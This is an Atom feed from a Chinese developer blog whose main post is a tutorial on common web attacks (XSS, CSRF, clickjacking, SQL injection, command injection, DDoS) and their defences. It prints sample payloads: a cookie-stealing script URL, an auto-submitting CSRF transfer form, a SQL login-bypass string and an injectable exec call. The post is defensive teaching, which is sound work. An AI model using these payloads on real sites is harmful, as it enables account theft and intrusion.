<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>奇幻的梦之旅</title>
  
  <subtitle>http://llmysnow.top/</subtitle>
  <link href="http://llmysnow.top/atom.xml" rel="self"/>
  
  <link href="http://llmysnow.top/"/>
  <updated>2021-08-12T07:58:52.192Z</updated>
  <id>http://llmysnow.top/</id>
  
  <author>
    <name>LiLyn</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>常见 Web 攻击（前端篇）</title>
    <link href="http://llmysnow.top/posts/8188972/"/>
    <id>http://llmysnow.top/posts/8188972/</id>
    <published>2021-08-12T07:53:44.453Z</published>
    <updated>2021-08-12T07:58:52.192Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>Cross Site Scripting（跨站脚本攻击），因为缩写和 CSS 重叠，所以改叫 XSS。跨站脚本攻击是指通过存在安全漏洞的 Web 网址注册用户的浏览器内运行非本站点 HTML 或 JavaScript 进行的一种攻击</p><p>跨站脚本攻击可以造成以下影响：</p><ul><li><p>利用虚假输入表单骗取用户个人信息</p></li><li><p>利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求</p><p>显示伪造的文章或图片</p></li></ul><h3 id="XSS-攻击分类"><a href="#XSS-攻击分类" class="headerlink" title="XSS 攻击分类"></a>XSS 攻击分类</h3><h4 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h4><ul><li><p>反射型：url 参数直接注入</p><p>URL 注入非法脚本，然后发送给受害用户</p><p>服务端返回的富文本中包含非法脚本，被直接展示</p></li></ul><p>反射型 XSS 攻击步骤：</p><ol><li>攻击者构造出特殊的 URL，其中包含恶意代码</li><li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 普通 --&gt;</span></span><br><span class="line">http://localhost:3000/?from=china</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- alert尝试 --&gt;</span></span><br><span class="line">http://localhost:3000/?from=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(3)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 获取Cookie --&gt;</span></span><br><span class="line">http://localhost:3000/?from=<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:4000/hack.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 伪造cookie入侵 --&gt;</span></span><br><span class="line">document.cookie=&quot;...&quot;</span><br></pre></td></tr></table></figure><h4 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h4><ul><li><p>存储型：存储到 DB 后读取时注入</p><p>发帖中发出包含恶意代码的内容，其它用户访问到该内容后，满足特定条件即触发</p><p>后台不过滤信息，并且前端展示时也不过滤信息</p></li></ul><p>存储型 XSS 的攻击步骤：</p><ol><li>攻击者将恶意代码提交到目标网站的数据库中</li><li>用户打开网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 评论 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 跨站脚本注入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:4000/hack.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h4><ul><li><p>DOM型：基于 DOM 或本地的 XSS 攻击</p><p>wifi 流量劫持、DNS 劫持，并且直接返回钓鱼页面</p></li></ul><p>DOM 型 XSS 其实是一种特殊类型的反射型 XSS，通过 <strong>JS 操作 DOM 树</strong> 动态地 <strong>输出数据到页面</strong>，而不依赖于将数据提交给服务器端，它是基于 DOM 文档对象模型的一种漏洞</p><p>DOM 型 XSS 的攻击步骤：</p><ol><li>攻击者构造出特殊的 URL，其中包含恶意代码</li><li>用户打开带有恶意代码的 URL</li><li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;script&gt;alert(0)&lt;\/script&gt;&quot;</span>)</span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(location.hash.substr(<span class="number">1</span>))</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><p>反射型 XSS 跟存储型 XSS 区别：</p><ul><li>存储型 XSS 的恶意代码存在数据库里</li><li>反射型 XSS 的恶意代码存在 URL 里</li></ul><p>DOM 型 XSS 和前两种 XSS 区别：</p><ul><li>DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞</li><li>其他两种 XSS 都属于服务端的安全漏洞</li></ul><h3 id="攻击危害"><a href="#攻击危害" class="headerlink" title="攻击危害"></a>攻击危害</h3><ul><li>盗取用户 Cookie</li><li>钓鱼攻击</li><li>偷取网站的任意数据</li><li>偷取用户的资料</li><li>偷取用户的秘密和登录态</li><li>删除目标文字、恶意篡改数据、嫁祸</li><li>劫持用户 Web 行为，进一步渗透内网</li><li>蠕虫式挂马攻击、刷广告、刷流量、破坏网上数据</li></ul><h3 id="防范手段"><a href="#防范手段" class="headerlink" title="防范手段"></a>防范手段</h3><h4 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h4><p>0：禁止 XSS 过滤</p><p>1：启用 XSS 过滤（通常浏览器是默认的）。如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.set(<span class="string">&#x27;X-XSS-Protection&#x27;</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><p><strong>内容安全策略</strong>（CSP, Content Security Policy）是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入等攻击。这些攻击可用于实现从数据窃取到网站破坏或作为恶意软件分发版本等用途</p><p><strong>CSP 本质就是建立白名单</strong>，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只允许加载本站资源</span></span><br><span class="line">ctx.set(<span class="string">&#x27;Content-Security-Policy&#x27;</span>, <span class="string">&quot;default-src &#x27;self&#x27;&quot;</span>)</span><br><span class="line"><span class="comment">// 只允许加载 HTTPS 协议图片</span></span><br><span class="line">ctx.set(<span class="string">&#x27;Content-Security-Policy&#x27;</span>, <span class="string">&#x27;img-src https://*&#x27;</span>)</span><br><span class="line"><span class="comment">// 不允许加载任何来源框架</span></span><br><span class="line">ctx.set(<span class="string">&#x27;Content-Security-Policy&#x27;</span>, <span class="string">&quot;child-src &#x27;none&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="转义字符（过滤）"><a href="#转义字符（过滤）" class="headerlink" title="转义字符（过滤）"></a>转义字符（过滤）</h4><ul><li>输入处理：用户输入、URL 参数、POST 请求参数、Ajax</li><li>输出处理：转为实体名称</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% code %&gt; 用于执行其中JavaScript代码</span><br><span class="line">&lt;%&#x3D; code %&gt; 会对code进行html转义</span><br><span class="line">&lt;%- code %&gt; 不会进行转义</span><br></pre></td></tr></table></figure><ul><li><p>黑名单</p><p>用户的输入永远不可信任，最普通的做法就是转义输入输出的内容，对于引号、尖括号、斜杠进行转义</p><p>把显示结果转为实体名称</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/html%E5%AE%9E%E4%BD%93%E5%90%8D%E7%A7%B0.jpg"></p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  str = str.replace(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quto;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/`/g</span>, <span class="string">&#x27;&amp;#96;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2F;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>白名单</p><p>对于富文本来说，显然不能通过上面办法转义所有字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用白名单过滤的方法</p><p><strong>对用户的输入进行合理的验证，对特殊字符（如：&lt;、&gt;、”、”等）</strong>以及 <code>&lt;script&gt;</code> 、javascript 等进行过滤</p></li></ul><p>编程语言解决方案：</p><ul><li><p>nodejs 使用 <a href="https://github.com/leizongmin/js-xss">js-xss</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xss = <span class="built_in">require</span>(<span class="string">&quot;xss&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> html = xss(<span class="string">&#x27;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>Java 使用 <a href="https://github.com/naver/lucy-xss-filter">lucy-xss-filter</a></p><p>Java 里，常用的转义库为  <code>org.owasp.encoder</code></p></li><li><p>Spring Boot</p><p><a href="https://zdran.com/20180511.html">Spring Boot 使用 Jsoup 拦截XSS</a></p></li></ul><h4 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h4><p>这是预防 XSS 攻击窃取用户 cookie 最有效的防御手段。Web 应用程序设置 cookie 时，将其属性设为 HttpOnly，就可以避免该网页的 cookie 被客户端恶意 JavaScript 窃取，保护用户 cookie 信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># node</span></span><br><span class="line">app.use(session(&#123; httpOnly: <span class="literal">true</span> &#125;, app))</span><br><span class="line"><span class="comment"># java</span></span><br><span class="line">cookie.setHttpOnly(<span class="literal">true</span>)</span><br><span class="line"><span class="comment"># python</span></span><br><span class="line">tools.sessions.httponly = True</span><br><span class="line"><span class="comment"># php</span></span><br><span class="line">session.cookie_httponly = 1</span><br></pre></td></tr></table></figure><h4 id="DOM-型注意"><a href="#DOM-型注意" class="headerlink" title="DOM 型注意"></a>DOM 型注意</h4><p>在使用 <code>innerHTML</code>、<code>outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插入页面上，而应尽量使用 <code>.textContent</code> 、<code>setAttribute()</code> 等</p><p>如果使用 Vue 或 React 技术栈，并不适用 <code>v-html / dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code>innerHTML</code> 、<code>outerHTML</code> 的 XSS 隐患</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="javascript"><span class="comment">// setTimeout()/setInterval() 中调⽤恶意代码</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">setTimeout</span>(<span class="string">&quot;UNTRUSTED&quot;</span>)</span></span><br><span class="line"><span class="javascript"><span class="built_in">setInterval</span>(<span class="string">&quot;UNTRUSTED&quot;</span>)</span></span><br><span class="line"><span class="javascript"><span class="comment">// location 调⽤恶意代码</span></span></span><br><span class="line"><span class="javascript">location.href = <span class="string">&#x27;UNTRUSTED&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// eval() 中调⽤恶意代码</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(<span class="string">&quot;UNTRUSTED&quot;</span>) </span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>对于不信任的输入，都应该限定一个合理的长度</strong></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF（Cross Site Request Forgery），即跨站请求伪造，是一种常见 Web 攻击，它利用用户已登录的身份，在用户毫不知情的情况下，已用户的名义完成非法操作</p><p>CSRF 攻击流程：</p><ul><li>受害者登录 <code>a.com</code>，并保留了登录凭证（Cookie）</li><li>攻击者引诱受害者访问了 <code>b.com</code></li><li><code>b.com</code> 向 <code>a.com</code> 发送了一个请求：<code>a.com/act=xxx</code> 浏览器会默认携带 <code>a.com</code> 的 Cookie</li><li><code>a.com</code> 接收到请求后，对请求进行验证，并确认是受害者的凭证，误认为是受害者自己发送的请求</li><li><code>a.com</code> 以受害者的名义执行了 <code>act=xxx</code></li><li>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让 <code>a.com</code> 执行了自己定义的操作</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- GET 请求 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:9000/transfer?to_user=jack&amp;money=2000&quot;</span> <span class="attr">width</span>=<span class="string">&quot;500&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- POST 请求 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;display: none&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf-frame&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:9000/transfer&quot;</span> <span class="attr">target</span>=<span class="string">&quot;csrf-frame&quot;</span> <span class="attr">id</span>=<span class="string">&quot;csrf-form&quot;</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to_user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hack01&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2000&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">&quot;csrf-form&quot;</span>).submit()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="CSRF-攻击危害"><a href="#CSRF-攻击危害" class="headerlink" title="CSRF 攻击危害"></a>CSRF 攻击危害</h3><ul><li>利用用户登录态</li><li>用户不知情</li><li>完成业务需求</li><li>盗取用户资金（转账、消费）</li><li>冒充用户发帖背锅</li><li>损害网站声誉</li></ul><h3 id="防范手段-1"><a href="#防范手段-1" class="headerlink" title="防范手段"></a>防范手段</h3><p>CSRF 两个特点：</p><ul><li><p>CSRF（通常）发生在第三方域名</p><p>阻止不明外域的访问（同源检测、Samesite Cookie）</p></li><li><p>CSRF 攻击者不能获取到 Cookie 等信息，只是使用</p><p>提交时要求附加本域才能获取的信息（CSRF Token、双重 Cookie 验证）</p></li></ul><p>cookie 的应用场景：</p><ul><li>自动登录</li><li>电商购物车功能</li><li>记录用户登录网址的次数</li><li>商品浏览记录</li></ul><p>防范手段：</p><ul><li><p>验证码</p></li><li><p><strong>同源检测 验证 Referer</strong></p><p>HTTP 协议头中有一个字段叫 referer，记录了该 HTTP 请求的来源地址</p><p>Https 不发生 referer</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">await</span> next()</span><br><span class="line">    <span class="keyword">const</span> referer = ctx.request.header.referer</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Referer:&#x27;</span>, referer)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/HTTP%20Referer.jpg" style="zoom:80%;" /><p>比如：转账的操作一定是用户登陆之后在本站点的页面上操作的，因此可以讲 Referer 字段限制为只允许本站点</p></li><li><p><strong>Anti CSRF Token</strong></p><p>所有用户请求都携带一个 CSRF 攻击者无法获取到的 Token。服务器通过校验请求是否携带正确 Token，来把正确请求和攻击的请求区分开</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;csrf-token&quot;</span> <span class="attr">content</span>=<span class="string">&quot;...&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>确保 token 的保密性和随机性</p></li><li><p>cookie 双重验证</p><p>CSRF 成功的原因在于站点对于用户身份的辨别依赖于 Cookie，因此攻击者可以在不知道用户口令的情况下直接使用用户的 Cookie 来通过安全验证</p></li></ul><p><strong>Samesite Cookie 属性</strong></p><ul><li><code>Samesite=Strict</code>：严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie</li><li><code>Samesite=Lax</code>：宽松模式，比 Strict 放宽了点限制，假如这个请求是这个请求且是个 GET 请求，则这个 Cookie 可以作为第三方 Cookie</li></ul><p>注意：这个可以解决 <code>某些 Cookie 滥用推荐的“SameSite“属性 </code> 问题</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookies.set(<span class="string">&#x27;lang&#x27;</span>, lang, &#123;</span><br><span class="line">  sameSite: <span class="string">&#x27;Strict&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="点击劫持-clickjacking"><a href="#点击劫持-clickjacking" class="headerlink" title="点击劫持 clickjacking"></a>点击劫持 clickjacking</h2><p>点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面透出一个按钮诱导用户点击</p><ul><li><p>DNS 劫持：（输入京东被强制跳转到淘宝，这就属于 DNS 劫持）</p><p>DNS 强制解析：通过修改运营商的本地 DNS 记录，来引导用户流量到缓存服务器</p><p>302 跳转的方式：通过监控网络出口的流量，分析判断哪些内容是可以进行劫持处理的，再对劫持内存发起 302 跳转的回复，引导用户获取内容</p></li><li><p>HTTP 劫持：（访问谷歌但是一直有贪玩蓝月的广告）由于 http 明文传输，运营商会修改你的 http 响应内容（即加广告）</p></li></ul><h3 id="防范手段-2"><a href="#防范手段-2" class="headerlink" title="防范手段"></a>防范手段</h3><ul><li><p>最有效的方法就是全站 HTTPS，即 HTTP 加密，这使得运营商无法获取明文，就无法劫持你的响应内容</p></li><li><p>X-FRAME-OPTIONS</p><p><code>X-FRAME-OPTIONS</code> 是一个 HTTP 响应头，在现代浏览器有一个很好的支持。这个 HTTP 响应头就是为了防御用 iframe 嵌套的点击劫持</p><p>改响应头有三个值可选，分别是：</p><ul><li><code>DENT</code> ：页面不允许通过 iframe 的方式展示</li><li><code>SAMEORIGIN</code> ：页面可以在相同域名下通过 iframe 的方式展示</li><li><code>ALLOW-FROM</code> ：页面可以在指定来源的 iframe 中展示</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.set(<span class="string">&#x27;X-FRAME-OPTIONS&#x27;</span>, <span class="string">&#x27;DENY&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>SQL 注入发生于 <strong>应用程序与数据库层</strong> 的安全漏洞</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 填入特殊密码</span></span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拼接后的SQL</span></span><br><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> test.user</span><br><span class="line"><span class="keyword">WHERE</span> username = <span class="string">&#x27;bird&#x27;</span></span><br><span class="line"><span class="keyword">AND</span> <span class="keyword">password</span> = <span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="攻击危害-1"><a href="#攻击危害-1" class="headerlink" title="攻击危害"></a>攻击危害</h3><ul><li>猜解后台数据库，盗取网站敏感信息</li><li>绕过验证登录网站后台</li><li>借助数据库的存储过程进行提权等操作</li></ul><h3 id="防范手段-3"><a href="#防范手段-3" class="headerlink" title="防范手段"></a>防范手段</h3><ul><li>严格限制 Web 应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害</li><li>后端代码检查输入的数据是否符合预期，严格限制变量的类型，例如使用正则表达式进行一些匹配处理</li><li>对进入数据库的特殊字符（<code>&#39;、&quot;、\、&lt;、&gt;、&amp;、*、;</code> 等），或编码转换。基本上所有的后端语言都有对字符串进行转义处理的 方法，比如 lodash 的 <code>lodash._escapehtmlchar</code> </li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; username, password &#125; = ctx.request.body</span><br><span class="line">    <span class="keyword">const</span> sql = <span class="string">`</span></span><br><span class="line"><span class="string">    SELECT *</span></span><br><span class="line"><span class="string">    FROM test.user</span></span><br><span class="line"><span class="string">    WHERE username = ?</span></span><br><span class="line"><span class="string">    AND password = ?</span></span><br><span class="line"><span class="string">    `</span></span><br><span class="line">    res = <span class="keyword">await</span> query(sql, [username, password])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h2><h3 id="OS-命令注入"><a href="#OS-命令注入" class="headerlink" title="OS 命令注入"></a>OS 命令注入</h3><p>OS 命令注入和 SQL 注入差不多，只不过 SQL 注入是针对数据库的，而 OS 命令注入是针对操作系统的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以 Node.js 为例，假如在接⼝中需要从 github 下载⽤户指定的 repo</span></span><br><span class="line"><span class="keyword">const</span> exec = <span class="built_in">require</span>(<span class="string">&#x27;mz/child_process&#x27;</span>).exec;</span><br><span class="line"><span class="keyword">let</span> params = &#123;<span class="comment">/* ⽤户输⼊的参数 */</span>&#125;;</span><br><span class="line">exec(<span class="string">`git clone <span class="subst">$&#123;params.repo&#125;</span> /some/path`</span>);</span><br></pre></td></tr></table></figure><h3 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h3><p>distributed denial of service，DDOS 不是一种攻击，而是一大类攻击的总称。其中，比较常见的一种攻击是 cc 攻击。它就是简单粗暴地送来大量正常的请求，超出服务器的最大承受量，导致宕机</p><ul><li><p>SYN Flood</p><p>此攻击通过向目标发送具有可欺骗性源 IP 地址的大量 TCP “初始连接请求” SYN 数据包来利用 TCP 握手。目标机器响应每个连接请求，然后等待握手中的最后一步，这一步从未发生过，耗尽了进程中的目标资源</p></li><li><p>HTTP Flood</p><p>此攻击类似于同时在多个不同计算机上反复按 Web 浏览器中的刷新（大量 HTTP 请求泛滥服务器，导致拒绝服务）</p></li></ul><p><strong>防御手段</strong></p><ul><li>备份网站</li><li>HTTP 请求拦截 高防 IP</li><li>宽带扩容 + CDN</li></ul>]]></content>
    
    
    <summary type="html">XSS分类与防范、CSRF攻击流程与防范、SQL注入、点击劫持、DDOS等</summary>
    
    
    
    <category term="网络" scheme="http://llmysnow.top/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="XSS" scheme="http://llmysnow.top/tags/XSS/"/>
    
    <category term="CSRF" scheme="http://llmysnow.top/tags/CSRF/"/>
    
    <category term="网络安全" scheme="http://llmysnow.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Vue 中使用 Upload 组件上传 Excel</title>
    <link href="http://llmysnow.top/posts/5c61fd6a/"/>
    <id>http://llmysnow.top/posts/5c61fd6a/</id>
    <published>2021-07-02T09:28:37.958Z</published>
    <updated>2021-07-06T01:48:09.985Z</updated>
    
